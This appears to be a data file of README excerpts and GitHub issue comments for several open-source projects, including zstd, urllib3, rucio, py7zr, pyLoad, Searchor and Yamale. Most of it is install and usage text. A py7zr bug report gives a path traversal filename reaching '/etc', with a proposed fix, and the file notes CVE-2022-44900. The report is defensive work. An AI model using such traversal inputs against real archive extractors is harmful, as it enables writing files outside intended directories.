conventions](https://www.gnu.org/prep/standards/html_node/Makefile-Conventions.html),\nallowing staged install, standard flags, directory variables and command variables.\n\nFor advanced use cases, specialized compilation flags which control binary generation\nare documented in [`lib/README.md`](lib/README.md#modular-build) for the `libzstd` library\nand in [`programs/README.md`](programs/README.md#compilation-variables) for the `zstd` CLI.\n\n### cmake\n\nA `cmake` project generator is provided within `build/cmake`.\nIt can generate Makefiles or other build scripts\nto create `zstd` binary, and `libzstd` dynamic and static libraries.\n\nBy default, `CMAKE_BUILD_TYPE` is set to `Release`.\n\n#### Support for Fat (Universal2) Output\n\n`zstd` can be built and installed with support for both Apple Silicon (M1/M2) as well as Intel by using CMake's Universal2 support.\nTo perform a Fat/Universal2 build and install use the following commands:\n\n```bash\ncmake -B build-cmake-debug -S build/cmake -G Ninja -DCMAKE_OSX_ARCHITECTURES=\"x86_64;x86_64h;arm64\"\ncd build-cmake-debug\nninja\nsudo ninja install\n```\n\n### Meson\n\nA Meson project is provided within [`build/meson`](build/meson). Follow\nbuild instructions in that directory.\n\nYou can also take a look at [`.travis.yml`](.travis.yml) file for an\nexample about how Meson is used to build this project.\n\nNote that default build type is **release**.\n\n### VCPKG\nYou can build and install zstd [vcpkg](https://github.com/Microsoft/vcpkg/) dependency manager:\n\n    git clone https://github.com/Microsoft/vcpkg.git\n    cd vcpkg\n    ./bootstrap-vcpkg.sh\n    ./vcpkg integrate install\n    ./vcpkg install zstd\n\nThe zstd port in vcpkg is kept up to date by Microsoft team members and community contributors.\nIf the version is out of date, please [create an issue or pull request](https://github.com/Microsoft/vcpkg) on the vcpkg repository.\n\n### Conan\n\nYou can install pre-built binaries for zstd or build it from source using [Conan](https://conan.io/). Use the following command:\n\n```bash\nconan install --requires=\"zstd/[*]\" --build=missing\n```\n\nThe zstd Conan recipe is kept up to date by Conan maintainers and community contributors.\nIf the version is out of date, please [create an issue or pull request](https://github.com/conan-io/conan-center-index) on the ConanCenterIndex repository.\n\n### Visual Studio (Windows)\n\nGoing into `build` directory, you will find additional possibilities:\n- Projects for Visual Studio 2005, 2008 and 2010.\n  + VS2010 project is compatible with VS2012, VS2013, VS2015 and VS2017.\n- Automated build scripts for Visual compiler by [@KrzysFR](https://github.com/KrzysFR), in `build/VS_scripts`,\n  which will build `zstd` cli and `libzstd` library without any need to open Visual Studio solution.\n\n### Buck\n\nYou can build the zstd binary via buck by executing: `buck build programs:zstd` from the root of the repo.\nThe output binary will be in `buck-out/gen/programs/`.\n\n### Bazel\n\nYou easily can integrate zstd into your Bazel project by using the module hosted on the [Bazel Central Repository](https://registry.bazel.build/modules/zstd).\n\n## Testing\n\nYou can run quick local smoke tests by running `make check`.\nIf you can't use `make`, execute the `playTest.sh` script from the `src/tests` directory.\nTwo env variables `$ZSTD_BIN` and `$DATAGEN_BIN` are needed for the test script to locate the `zstd` and `datagen` binary.\nFor information on CI testing, please refer to `TESTING.md`.\n\n## Status\n\nZstandard is currently deployed within Facebook and many other large cloud infrastructures.\nIt is run continuously to compress large amounts of data in multiple formats and use cases.\nZstandard is considered safe for production environments.\n\n## License\n\nZstandard is dual-licensed under [BSD](LICENSE) OR [GPLv2](COPYING).\n\n## Contributing\n\nThe `dev` branch is the one where all contributions are merged before reaching `release`.\nIf you plan to propose a patch, please commit into the `dev` branch, or its own feature branch.\nDirect commit to `release` are not permitted.\nFor more information, please read [CONTRIBUTING](CONTRIBUTING.md).\n",

Much of the\nPython ecosystem already uses urllib3 and you should too.\nurllib3 brings many critical features that are missing from the Python\nstandard libraries:\n\n- Thread safety.\n- Connection pooling.\n- Client-side SSL/TLS verification.\n- File uploads with multipart encoding.\n- Helpers for retrying requests and dealing with HTTP redirects.\n- Support for gzip, deflate, brotli, and zstd encoding.\n- Proxy support for HTTP and SOCKS.\n- 100% test coverage.\n\nurllib3 is powerful and easy to use:\n\n```python3\n>>> import urllib3\n>>> resp = urllib3.request(\"GET\", \"http://httpbin.org/robots.txt\")\n>>> resp.status\n200\n>>> resp.data\nb\"User-agent: *\\nDisallow: /deny\\n\"\n```\n\n## Installing\n\nurllib3 can be installed with [pip](https://pip.pypa.io):\n\n```bash\n$ python -m pip install urllib3\n```\n\nAlternatively, you can grab the latest source code from [GitHub](https://github.com/urllib3/urllib3):\n\n```bash\n$ git clone https://github.com/urllib3/urllib3.git\n$ cd urllib3\n$ pip install .\n```\n\n\n## Documentation\n\nurllib3 has usage and reference documentation at [urllib3.readthedocs.io](https://urllib3.readthedocs.io).\n\n\n## Community\n\nurllib3 has a [community Discord channel](https://discord.gg/urllib3) for asking questions and\ncollaborating with other contributors. Drop by and say hello 👋\n\n\n## Contributing\n\nurllib3 happily accepts contributions. Please see our\n[contributing documentation](https://urllib3.readthedocs.io/en/latest/contributing.html)\nfor some tips on getting started.\n\n\n## Security Disclosures\n\nTo report a security vulnerability, please use the\n[Tidelift security contact](https://tidelift.com/security).\nTidelift will coordinate the fix and disclosure with maintainers.\n\n\n## Maintainers\n\n- [@sethmlarson](https://github.com/sethmlarson) (Seth M. Larson)\n- [@pquentin](https://github.com/pquentin) (Quentin Pradet)\n- [@illia-v](https://github.com/illia-v) (Illia Volochii)\n- [@theacodes](https://github.com/theacodes) (Thea Flowers)\n- [@haikuginger](https://github.com/haikuginger) (Jess Shapiro)\n- [@lukasa](https://github.com/lukasa) (Cory Benfield)\n- [@sigmavirus24](https://github.com/sigmavirus24) (Ian Stapleton Cordasco)\n- [@shazow](https://github.com/shazow) (Andrey Petrov)\n\n👋\n\n\n## Sponsorship\n\nIf your company benefits from this library, please consider [sponsoring its\ndevelopment](https://urllib3.readthedocs.io/en/latest/sponsors.html).\n\n\n## For Enterprise\n\nProfessional support for urllib3 is available as part of the [Tidelift\nSubscription][1].  Tidelift gives software development teams a single source for\npurchasing and maintaining their software, with professional grade assurances\nfrom the experts who know it best, while seamlessly integrating with existing\ntools.\n\n[1]: https://tidelift.com/subscription/pkg/pypi-urllib3?utm_source=pypi-urllib3&utm_medium=referral&utm_campaign=readme\n",

In order of what I think would be best to worst:\r\n-  Option 1: Scanning the dependencies of LTS release as part of a periodic GH Action (https://github.com/actions/dependency-review-action) on the LTS branches, with a step that fails in case any dependencies are vulnerable. The workflow can then either:\r\n   - Open an issue (https://github.com/JasonEtco/create-an-issue), e.g. \"release-X-LTS, vulnerable dependencies found\" which would require manual updating from our side\r\n   - Open a PR (https://stackoverflow.com/questions/68057744/create-pull-request-with-github-action) to automatically update the dependencies - this might potentially get a bit too complicated and not worth the time (we'd also have to change this once we go from LTS releases that use the old `requirements` structure to the [new structure](https://github.com/rucio/rucio/pull/6767), unless we want to modify the LTS branches now to pin all dependencies in the same way that we're doing in the main branch\r\n- Option 2: Setting `open-pull-requests-limit` > 0 for LTS branches. The downside is that this will cause dependency upgrades for non-security updates too, which seems unnecessary.\r\n- Option 3: Manually updating the vulnerable dependencies in LTS branches whenever we get a security alert on the main branch; I think this relies too much on human effort. \r\n\r\n@bari12 thoughts?\r\n\r\nEdit: Another method, found [here](https://stackoverflow.com/a/71894638):\r\n- In the repo settings, we can switch default branch to an `LTS` branch, which triggers a Dependabot check right away and displays any vulnerabilities. On a regular basis (e.g. monthly) we could do:\r\n    1. Switch default branch to LTS branch\r\n    2. Check Dependabot vulnerabilities\r\n    3. Trigger Dependabot PRs for vulnerabilities, check CI passes, merge them\r\n    4. Switch default branch back to main branch\r\n\r\nThis is probably the simplest approach, but there might be downsides",

This was an existing issue, but Dependabot only saw it now because of the `noqa` comment that was added as part of this PR: https://github.com/rucio/rucio/pull/6703/files.\r\n\r\nThe easiest solution according to https://github.com/rucio/rucio/security/dependabot/15 would be to increase the lower bound version of `requests` to `2.32.0`. I'm in favour of this solution, as the current `requests` version range is not based on any specific requirements AFAIK.\r\n\r\nThe other solutions proposed are:\r\n- not using `verify=False` for the first request to a host while using a Requests Session - I'm not sure if this might break the functionality of that line\r\n- call `close()` on Session objects to clear existing connections if `verify=False` is used. - I think this is the safer/simpler option from the point of view of not breaking current functionality.",

However, we are pinned to `urllib3 1.x`: https://github.com/rucio/rucio/blob/c8cb923ba46b8ac87c21c74eb49ba41967767742/requirements.txt#L3C1-L3C17, so this does not affect us.\r\n\r\nIMO it's safe to upgrade the lower version limit for `requests` to 2.32.0 here.",

When you doubt for usage of py7zr library with unclear\nmanuals, please feel easy to raise question on forum.\n\nCompression algorithms\n======================\n\n``py7zr`` supports algorithms and filters which `lzma module`_ and `liblzma`_ support,\nand supports BZip2 and Deflate that are implemented in python core libraries,\nIt also supports ZStandard, Brotli and PPMd with third party libraries.\n\n``py7zr`` is also able to encrypt and decrypt data using 3rd party encryption library.\n\n\nSupported algorithms\n--------------------\n\n* compress\n    * LZMA2\n    * LZMA\n    * Bzip2\n    * Deflate\n    * Copy\n    * ZStandard\n    * Brotli\n    * PPMd\n    * Enhanced Deflate (Experimental)\n\n* crypt\n    * 7zAES\n\n* Filters\n    * Delta\n    * BCJ(X86,ARMT,ARM,PPC,SPARC,IA64)\n\n.. note::\n  * A feature handling symbolic link is basically compatible with ``p7zip`` implementation,\n    but not work with original 7-zip because the original does not implement the feature.\n  * ``py7zr`` try checking symbolic links strictly and raise ValueError when bad link is requested,\n    but it does **not** guarantee to block all the bad cases.\n  * ZStandard and Brotli is not default methods of 7-zip, so these archives are considered\n    not to be compatible with original 7-zip on windows/p7zip on linux/mac.\n  * Enhanced Deflate is also known as ``DEFLATE64`` :sup:`TM` that is a registered trademark of ``PKWARE, Inc.``\n  * Enhanced Deflate is tested only on CPython. It is disabled on PyPy.\n\nNot supported algorithms\n------------------------\n\n* BCJ2 (Standard `lzma module`_ does not provide).\n\n\nInstall\n=======\n\nYou can install py7zr as usual other libraries using pip.\n\n.. code-block:: shell\n\n    $ pip install py7zr\n\nOR, alternatively using conda:\n\n.. code-block:: shell\n\n    $ conda install -c conda-forge py7zr\n\nDocuments\n=========\n\nUser manuals\n------------\n\n* `User Guide`_ for latest version.\n\n* `API Guide`_ for latest version.\n\n* `Manual`_ for stable version.\n\nDeveloper guide\n---------------\n\n* `Contribution guidelines`_ for this project.\n\n* `Contribution guidelines(html)`_  for this project.\n\n* `Code of conduct`_ for this project.\n\n* `Code of conduct(html)`_ for this project.\n\n* `7z file specification`_ that py7zr stand on.\n\n\n.. _`User Guide`: https://py7zr.readthedocs.io/en/latest/user_guide.html\n\n.. _`API Guide` : https://py7zr.readthedocs.io/en/latest/api.html\n\n.. _`Manual` : https://py7zr.readthedocs.io/en/stable/\n\n.. _`Contribution guidelines(html)` : https://py7zr.readthedocs.io/en/latest/contribution.html\n\n.. _`Contribution guidelines` : docs/contribution.rst\n\n.. _`Code  of conduct` : docs/CODE_OF_CONDUCT.rst\n\n.. _`Code  of conduct(html)` : https://py7zr.readthedocs.io/en/latest/CODE_OF_CONDUCT.html\n\n.. _`7z file specification` : https://py7zr.readthedocs.io/en/latest/archive_format.html\n\n\nCLI Usage\n=========\n\nYou can run command script py7zr like as follows;\n\n* List archive contents\n\n.. code-block:: shell\n\n    $ py7zr l test.7z\n\n* Extract archive\n\n.. code-block:: shell\n\n    $ py7zr x test.7z\n\n* Extract archive with password\n\n.. code-block:: shell\n\n    $ py7zr x -P test.7z\n      password?: ****\n\n* Create and compress to archive\n\n.. code-block:: shell\n\n    $ py7zr c target.7z test_dir\n\n* Create multi-volume archive\n\n.. code-block:: shell\n\n    $ py7zr c -v 500k target.7z test_dir\n\n* Test archive\n\n.. code-block:: shell\n\n    $ py7zr t test.7z\n\n* Append files to archive\n\n.. code-block:: shell\n\n    $ py7zr a test.7z test_dir\n\n* Show information\n\n.. code-block:: shell\n\n    $ py7zr i\n\n* Show version\n\n.. code-block:: shell\n\n    $ py7zr --version\n\n\nSevenZipFile Class Usage\n========================\n\npy7zr is a library which can use in your python application.\n\nDecompression/Decryption\n------------------------\n\nHere is a code snippet how to decompress some file in your application.\n\n.. code-block:: python\n\n    import py7zr\n\n    archive = py7zr.SevenZipFile('sample.7z', mode='r')\n    archive.extractall(path=\"/tmp\")\n    archive.close()\n\n\n\nYou can also use 'with' block because py7zr provide context manager(v0.6 and later).\n\n.. code-block:: python\n\n    import py7zr\n\n    with py7zr.SevenZipFile('sample.7z', mode='r') as z:\n        z.extractall()\n\n    with py7zr.SevenZipFile('target.7z', 'w') as z:\n        z.writeall('./base_dir')\n\n\n``py7zr`` also supports extraction of single or selected files by 'extract(targets=['file path'])'.\nNote: if you specify only a file but not a parent directory, it will fail.\n\n.. code-block:: python\n\n    import py7zr\n    import re\n\n    filter_pattern = re.compile(r'<your/target/file_and_directories/regex/expression>')\n    with py7zr.SevenZipFile('archive.7z', 'r') as archive:\n        allfiles = archive.getnames()\n        selective_files = [f for f in allfiles if filter_pattern.match(f)]\n        archive.extract(targets=selective_files)\n\n\npy7zr support an extraction of password protected archive.(v0.6 and later)\n\n.. code-block:: python\n\n    import py7zr\n\n    with py7zr.SevenZipFile('encrypted.7z', mode='r', password='secret') as z:\n        z.extractall()\n\nCompression/Encryption\n----------------------\n\nHere is a code snippet how to produce archive.\n\n.. code-block:: python\n\n    import py7zr\n\n    with py7zr.SevenZipFile('target.7z', 'w') as archive:\n        archive.writeall('/path/to/base_dir', 'base')\n\n\nTo create encrypted archive, please pass a password.\n\n.. code-block:: python\n\n    import py7zr\n\n    with py7zr.SevenZipFile('target.7z', 'w', password='secret') as archive:\n        archive.writeall('/path/to/base_dir', 'base')\n\n\nTo create archive with algorithms such as zstandard, you can call with custom filter.\n\n.. code-block:: python\n\n    import py7zr\n\n    my_filters = [{\"id\": py7zr.FILTER_ZSTD}]\n    another_filters = [{\"id\": py7zr.FILTER_ARM}, {\"id\": py7zr.FILTER_LZMA2, \"preset\": 7}]\n    with py7zr.SevenZipFile('target.7z', 'w', filters=my_filters) as archive:\n        archive.writeall('/path/to/base_dir', 'base')\n\n\nshutil helper\n=============\n\npy7zr also support `shutil`  interface.\n\n.. code-block:: python\n\n    from py7zr import pack_7zarchive, unpack_7zarchive\n    import shutil\n\n    #

It requires about 300MiB - 700MiB free memory to work well at least.\n\n\nUse Cases\n=========\n\n- `PyTorch`_  Open-source deep learning framework.\n- `aqtinstall`_ Another (unofficial) Qt (aqt) CLI Installer on multi-platforms.\n- PreNLP_ Preprocessing Library for Natural Language Processing\n- mlox_  a tool for sorting and analyzing Morrowind plugin load order\n\n.. _`PyTorch`: https://pytorch.org/\n.. _aqtinstall: https://github.com/miurahr/aqtinstall\n.. _PreNLP: https://github.com/lyeoni/prenlp\n.. _mlox: https://github.com/mlox/mlox\n\nSecurity\n========\n\nPlease find a `Security Policy`_ of this project.\n\nVersion 0.20.0, 0.19.0, 0.18.10 or before has a `vulnerability for path traversal`_  attack.\nDetails are on \"CVE-2022-44900: path traversal vulnerability in py7zr\" `disclose article`_ .\n\nAffected versions  are vulnerable to Directory Traversal due to insufficient checks in the 'py7zr.py' and 'helpers.py' files\n\nYou are recommend to update immediately to version 0.20.2 or later\n\n.. _`vulnerability for path traversal`: https://security.snyk.io/vuln/SNYK-PYTHON-PY7ZR-3092461\n\nI really appreciate Mr. Matteo Cosentino for notification and corporation on security improvement.\n\n.. _`disclose article`: https://lessonsec.com/cve/cve-2022-44900/\n\n.. _`Security Policy` : https://py7zr.readthedocs.io/en/latest/SECURITY.html\n\nLicense\n=======\n\n* Copyright (C) 2019-2024 Hiroshi Miura\n\n* pylzma Copyright (c) 2004-2015 by Joachim Bauch\n* 7-Zip Copyright (C) 1999-2010 Igor Pavlov\n* LZMA SDK Copyright (C) 1999-2010 Igor Pavlov\n\nThis library is free software; you can redistribute it and/or\nmodify it under the terms of the GNU Lesser General Public\nLicense as published by the Free Software Foundation; either\nversion 2.1 of the License, or (at your option) any later version.\n\nThis library is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

It just happens that some files I process have a lot zeroes.\r\n\r\nFrom my point of view, py7z seems to allocate twice the amount of memory the algorithm actually requires for decompression.\r\nProof that this seems like an implementation concern more than an algorithmic requirement is that the official 7z binary manages to extract the file within the same environment.\r\n\r\nRegarding the output data size limitation, my current understanding is currently too limited to comment your proposition.

Please describe.**\r\nCan't defend against a special path traversal attack\r\nwhen filename like `tmp/../../../../../etc/test.txt`\r\n`py7zr.extractall()` will release the file to the parent directory\r\n\r\nI think the reason is this code https://github.com/miurahr/py7zr/blob/master/py7zr/py7zr.py#L535-L539\r\n```python\r\n        for f in self.files:\r\n            # TODO: sanity check\r\n            # check whether f.filename with invalid characters: '../'\r\n            if f.filename.startswith(\"../\"):\r\n                raise Bad7zFile\r\n```\r\n\r\nIt only handles the case where the filename starts with `../../`\r\nbut if filename is `/tmp/../../../../`, it still case a path traversal attack\r\n\r\nyou can get malicious 7z file from https://github.com/jwilk/traversal-archives \r\n**Non-leading dot-dot** part\r\n\r\n\r\n**Describe the solution you'd like**\r\nadd more logic about check filename. like below\r\n```python\r\ndef compress_file_name_check(dir_path, file_name):\r\n    file_name = file_name.lstrip(\"./\")\r\n    full_path = os.path.join(dir_path, file_name)\r\n    if os.path.commonprefix((os.path.realpath(full_path), dir_path)) != dir_path:\r\n        return None\r\n    else:\r\n        return file_name\r\n```\r\nThere is a more detailed discussion thread here, \r\nhttps://stackoverflow.com/questions/45188708/how-to-prevent-directory-traversal-attack-from-python-code\r\nhttps://stackoverflow.com/questions/6803505/does-my-code-prevent-directory-traversal\r\n",

Unexpected crashes may occur.\n\n### Extra Dependencies\n\nExtra dependencies are non-essential packages that enable additional features of pyLoad.\n\nTo install them you have to append a specific tag name to the installation command.\n\n#### Available tags\n\n-   `plugins`: includes packages used by several plugins.\n-   `build`: includes packages used to [build translations](#build-translations).\n-   `all`: includes both plugins and build packages.\n\nYou can use a tag in this way:\n\n    pip install pyload-ng[plugins]\n\nOr group more together:\n\n    pip install pyload-ng[plugins][build]\n\n### Build Translations\n\nUse the command `build_locale` to retrieve and build the latest locale files (translations):\n\n    python setup.py build_locale\n\nInvoke `build_locale` before building the package (eg. `bdist_wheel`).\n\n> **Note**:\n>\n> You don't need to build the translations if you installed pyLoad through `pip`, they're already included.\n\n## Report a Vulnerability\n\nPlease refer to [SECURITY](https://github.com/pyload/pyload/blob/main/SECURITY.md) to read our security policy.\n\n## Contribute to pyLoad\n\nPlease refer to [CONTRIBUTING](https://github.com/pyload/pyload/blob/main/CONTRIBUTING.md) to read our contribution guidelines.\n\n## Docker Images\n\n[![Docker build status](https://img.shields.io/docker/build/pyload/pyload?style=flat-square)](https://hub.docker.com/r/pyload/pyload)\n[![MicroBadger layers](https://img.shields.io/microbadger/layers/pyload/pyload?style=flat-square)](https://microbadger.com/images/pyload/pyload)\n[![MicroBadger size](https://img.shields.io/microbadger/image-size/pyload/pyload?style=flat-square)](https://microbadger.com/images/pyload/pyload)\n\n#### Available images\n\n-   `pyload/pyload:alpine`: docker image for amd64, arm and arm64v8.\n-   `pyload/pyload:ubuntu-arm32v7`: docker image for arm32v7.\n-   `pyload/pyload`: alias of `pyload/pyload:alpine`.\n\n### Create Container\n\n    docker create --name=pyload -v <USERDIR>:/config -v <STORAGEDIR>:/downloads --restart unless-stopped pyload/pyload\n\n> **Note**:\n>\n> Replace `<STORAGEDIR>` with the location on the host machine where you want that downloads will be saved.\n>\n> Replace `<USERDIR>` with where you want that user data files (configurations) are stored.\n\n### Start Container\n\n    docker start pyload\n\n### Stop Container\n\n    docker stop pyload\n\n### Show Logs\n\n    docker logs -f pyload\n\n### Docker Compose\n\nCompatible with `docker-compose` v2 schemas:\n\n    ---\n    version: '2'\n    services:\n      pyload:\n        image: pyload\n        build: <REPODIR>\n        container_name: pyload\n        environment:\n          -

Searchor is an a efficient tool for Python developers, with many web development needs in one, with support of over 100+ Engines and custom engines allowed, making it easy for developers to use for their web programming needs in Python without relying on many third-party dependencies. Furthermore, Searchor has a wide range of support, including command line interface and pip.\n\nInstallation\n------------\n**[Python 3.7+](https://www.python.org/downloads/) is required**\n```bash\n# MacOS / Linux (via Terminal)\npython3 -m pip install -U searchor\n\n# Windows (via CMD Prompt)\npy -3 -m pip install -U searchor\n```\n\nQuick Start\n-----------\n```python\n>>> from searchor import Engine\n>>> Engine.Google.search(\"Hello, World!\"))\n'https://www.google.com/search?q=Hello%2C%20World%21'\n```\nCustom Engine\n-------------\n```python\n>>> from searchor import Engine\n>>> Engine.new(\"Colgate\", \"https://www.colgate.com/en-us/search/all?term=\")\n>>> Engine.Colgate.search(\"Hi world!\")\n'https://www.colgate.com/en-us/search/all?term=Hi%20world!\"\n```\nSearchor CLI Quick Start\n```bash\n$ searchor Google \"Hello World!\" --copy\n```\n<br>\n</br>\n\nWeb Scrape\n----------\n```python\n>>> from searchor import Information\n>>> Information.scrape(\"https://google.com\")\n>>> '{'title': 'Google', 'paragraphs': [<p style=\"font-size:8pt;color:#70757a\">© 2023 - <a href=\"/intl/en/policies/privacy/\">Privacy</a> - <a href=\"/intl/en/policies/terms/\">Terms</a></p>]}'\n```\n\n\nGet Information\n---------------\n```python\n>>> from searchor import Information\n>>> Information.getinfo(\"GitHub\")\n>>> 'GitHub, Inc. is an Internet hosting service for software development and version control using Git. It provides the distributed version control of Git plus access control, bug tracking, software feature requests, task management, continuous integration, and wikis for every project. Headquartered in California, it has been a subsidiary of Microsoft since 2018.'\n```\nTake a look at more examples in the [examples](https://github.com/ArjunSharda/Searchor/tree/main/examples) folder!\n\n*Note*:&nbsp; Engine names follow the **UpperCamelCase** convention.(eg: ChromeWebStore).\n\nDocker\n------\n\nBuilding the docker image\n```sh\n$ docker build -t searchor .\n```\n\nRunning searchor on the docker container\n```sh\n$ docker run --rm -it searchor sh\n/usr/src/searchor/examples # python searchamazon.py\nhttps://www.amazon.com/s?k=Hello%2C%20World%21\n```\n\nv2.5.2 Changes\n--------------\nv2.5.0\n- **[ADDED]** Added a new Enum class `Information`.\n- **[ADDED]** Added `getinfo` function in the `Information` Enum to gather information about a given topic, using Wikipedia.\n- **[ADDED]** Add `web_scraper` function in the `Information` Enum, to web scrape a URL that is given.\n- **[ADDED]** Added bs4 and requests as dependencies.\n- **[MODIFIED]** The Searchor Package is now officially becoming a library, and is therefore no longer considered a package.\n\nv2.5.2\n- **[FIXED]** Fixed issue with web scraping, with attribute errors, and CLI issues\n\nMigration\n---------\nInstead of different functions for each engine, Searchor `v2.2.0` uses a single function with an `Engine` enum. This makes it easier to use and maintain. If you're migrating from `v2.0.0`, compare the differences between the following snippets:\n```python\n# Searchor 2.0.0\nfrom searchor import search, Engine\nsearch(\"Hello, World!\", Engine.Google)\n```\n```python\n# Searchor v2.2.0\nfrom searchor import Engine\nEngine.Google.search(\"Hello, World!\")\n```\n\n## Want to contribute?\nTake a look at the [contributing guidelines](CONTRIBUTING.md)!\n\n<hr>\n<h6 align=\"center\">© Arjun Sharda 2022-present\n<br>\nAll Rights Reserved</h6>\n",

Yamale does not protect against intentionally malicious schemas. |\n|:------------|\n\n<img src=\"https://github.com/23andMe/Yamale/blob/master/yamale.png?raw=true\" alt=\"Yamale\" width=\"400\"/>\n\nA schema and validator for YAML.\n\nWhat's YAML? See the current spec [here](http://www.yaml.org/spec/1.2/spec.html) and an introduction\nto the syntax [here](https://github.com/Animosity/CraftIRC/wiki/Complete-idiot's-introduction-to-yaml).\n\n[![Build Status](https://github.com/23andMe/Yamale/actions/workflows/run-tests.yml/badge.svg)](https://github.com/23andMe/Yamale/actions/workflows/run-tests.yml)\n[![PyPI](https://img.shields.io/pypi/v/yamale.svg)](https://pypi.python.org/pypi/yamale)\n\nRequirements\n------------\n* Python 3.8+\n* PyYAML\n* ruamel.yaml (optional)\n\nInstall\n-------\n### pip\n```bash\n$ pip install yamale\n```\n\nNOTE: Some platforms, e.g., Mac OS, may ship with only Python 2 and may not have pip installed.\nInstallation of Python 3 should also install pip. To preserve any system dependencies on default\nsoftware, consider installing Python 3 as a local package. Please note replacing system-provided\nPython may disrupt other software. Mac OS users may wish to investigate MacPorts, homebrew, or\nbuilding Python 3 from source; in all three cases, Apple's Command Line Tools (CLT) for Xcode\nmay be required. See also [developers](#developers), below.\n\n### Manual\n1. Download Yamale from: https://github.com/23andMe/Yamale/archive/master.zip\n2. Unzip somewhere temporary\n3. Run `python setup.py install` (may have to prepend `sudo`)\n\nUsage\n-----\n### Command line\nYamale can be run from the command line to validate one or many YAML files. Yamale will search the\ndirectory you supply (current directory is default) for YAML files. Each YAML file it finds it will\nlook in the same directory as that file for its schema, if there is no schema Yamale will keep\nlooking up the directory tree until it finds one. If Yamale can not find a schema it will tell you.\n\nUsage:\n\n```bash\nusage: yamale [-h] [-s SCHEMA] [-n CPU_NUM] [-p PARSER] [--no-strict] [PATH]\n\nValidate yaml files.\n\npositional arguments:\n  PATH                  folder to validate. Default is current directory.\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s SCHEMA, --schema SCHEMA\n                        filename of schema. Default is schema.yaml.\n  -n CPU_NUM, --cpu-num CPU_NUM\n                        number of CPUs to use. Default is 4.\n  -p PARSER, --parser PARSER\n                        YAML library to load files. Choices are \"ruamel\" or\n                        \"pyyaml\" (default).\n  --no-strict           Disable strict mode, unexpected elements in the data\n                        will be accepted.\n```\n\n### API\nThere are several ways to feed Yamale schema and data files. The simplest way is to let Yamale take\ncare of reading and parsing your YAML files.\n\nAll you need to do is supply the files' path:\n```python\n# Import Yamale and make a schema object:\nimport yamale\nschema = yamale.make_schema('./schema.yaml')\n\n# Create a Data object\ndata = yamale.make_data('./data.yaml')\n\n# Validate data against the schema. Throws a ValueError if data is invalid.\nyamale.validate(schema, data)\n```\n\nYou can pass a string of YAML to `make_schema()` and `make_data()` instead of passing a file path\nby using the `content=` parameter:\n\n```python\ndata = yamale.make_data(content=\"\"\"\nname: Bill\nage: 26\nheight: 6.2\nawesome: True\n\"\"\")\n```\n\nIf `data` is valid, nothing will happen. However, if `data` is invalid Yamale will throw a\n`YamaleError` with a message containing all the invalid nodes:\n```python\ntry:\n    yamale.validate(schema, data)\n    print('Validation success! 👍')\nexcept ValueError as e:\n    print('Validation failed!\\n%s' % str(e))\n    exit(1)\n```\nand an array of `ValidationResult`.\n```python\ntry:\n    yamale.validate(schema, data)\n    print('Validation success! 👍')\nexcept YamaleError as e:\n    print('Validation failed!\\n')\n    for result in e.results:\n        print(\"Error validating data '%s' with '%s'\\n\\t\" % (result.data, result.schema))\n        for error in result.errors:\n            print('\\t%s' % error)\n    exit(1)\n```\n\nYou can also specify an optional `parser` if you'd like to use the `ruamel.yaml` (YAML 1.2 support) instead:\n```python\n# Import Yamale and make a schema object, make sure ruamel.yaml is installed already.\nimport yamale\nschema = yamale.make_schema('./schema.yaml', parser='ruamel')\n\n# Create a Data object\ndata = yamale.make_data('./data.yaml', parser='ruamel')\n\n# Validate data against the schema same as before.\nyamale.validate(schema, data)\n```\n\n### Schema\n\n| :warning: Ensure that your schema definitions come from internal or trusted sources. Yamale does not protect against intentionally malicious schemas. |\n|:------------|\n\nTo use Yamale you must make a schema. A schema is a valid YAML file with one or more documents\ninside. Each node terminates in a string which contains valid Yamale syntax. For example, `str()`\nrepresents a [String validator](#validators).\n\nA basic schema:\n```yaml\nname: str()\nage: int(max=200)\nheight: num()\nawesome: bool()\n```\n\nAnd some YAML that validates:\n```yaml\nname: Bill\nage: 26\nheight: 6.2\nawesome: True\n```\n\nTake a look at the [Examples](#examples) section for more complex schema ideas.\n\n#### Includes\nSchema files may contain more than one YAML document (nodes separated by `---`). The first document\nfound will be the base schema. Any additional documents will be treated as Includes. Includes allow\nyou to define a valid structure once and use it several times. They also allow you to do recursion.\n\nA schema with an Include validator:\n```yaml\nperson1: include('person')\nperson2: include('person')\n---\nperson:\n    name: str()\n    age: int()\n```\n\nSome valid YAML:\n```yaml\nperson1:\n    name: Bill\n    age: 70\n\nperson2:\n    name: Jill\n    age: 20\n```\n\nEvery root node not in the first YAML document will be treated like an include:\n```yaml\nperson: include('friend')\ngroup: include('family')\n---\nfriend:\n    name: str()\nfamily:\n    name: str()\n```\n\nIs equivalent to:\n```yaml\nperson: include('friend')\ngroup: include('family')\n---\nfriend:\n    name: str()\n---\nfamily:\n    name: str()\n```\n\n##### Recursion\nYou can get recursion using the Include validator.\n\nThis schema:\n```yaml\nperson: include('human')\n---\nhuman:\n    name: str()\n    age: int()\n    friend: include('human', required=False)\n```\n\nWill validate this data:\n```yaml\nperson:\n    name: Bill\n    age: 50\n    friend:\n        name: Jill\n        age: 20\n        friend:\n            name: Will\n            age: 10\n```\n\n##### Adding external includes\nAfter you construct a schema you can add extra, external include definitions by calling\n`schema.add_include(dict)`. This method takes a dictionary and adds each key as another include.\n\n### Strict mode\nBy default Yamale will provide errors for extra elements present in lists and maps that are not\ncovered by the schema. With strict mode disabled (using the `--no-strict` command line option),\nadditional elements will not cause any errors. In the API, strict mode can be toggled by passing\nthe strict=True/False flag to the validate function.\n\nIt is possible to mix strict and non-strict mode by setting the strict=True/False flag in the\ninclude validator, setting the option only for the included validators.\n\nValidators\n----------\nHere are all the validators Yamale knows about. Every validator takes a `required` keyword telling\nYamale whether or not that node must exist. By default every node is required. Example: `str(required=False)`\n\nYou can also require that an optional value is not `None` by using the `none` keyword. By default\nYamale will accept `None` as a valid value for a key that's not required. Reject `None` values\nwith `none=False` in any validator. Example: `str(required=False, none=False)`.\n\nSome validators take keywords and some take arguments, some take both. For instance the `enum()`\nvalidator takes one or more constants as arguments and the `required` keyword:\n`enum('a string', 1, False, required=False)`\n\n### String - `str(min=int, max=int, equals=string, starts_with=string, ends_with=string, matches=regex, exclude=string, ignore_case=False, multiline=False, dotall=False)`\nValidates strings.\n- keywords\n    - `min`: len(string) >= min\n    - `max`: len(string) <= max\n    - `equals`: string == value (add `ignore_case=True` for 